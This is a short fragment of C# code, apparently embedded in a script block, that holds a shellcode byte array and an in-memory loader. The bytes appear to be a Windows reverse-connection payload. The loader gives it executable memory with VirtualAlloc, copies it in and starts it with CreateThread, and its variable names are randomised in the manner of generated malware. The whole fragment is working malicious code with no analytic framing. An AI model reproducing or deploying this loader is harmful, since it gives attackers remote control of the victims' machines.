...
0x68,0x00,0x00,0x13,0x88,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,
...
0xc3,0x29,0xc6,0x75,0xc1,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5 };
        ...
        IntPtr kitAztn9Tvy = VirtualAlloc(IntPtr.Zero,(UIntPtr)kH7vtCwFfI.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(kH7vtCwFfI,0,kitAztn9Tvy,kH7vtCwFfI.Length);
        IntPtr pJpI82Rt = IntPtr.Zero;
        IntPtr uuevk972 = CreateThread(IntPtr.Zero,UIntPtr.Zero,kitAztn9Tvy,IntPtr.Zero,0,ref pJpI82Rt);
    }
</script>
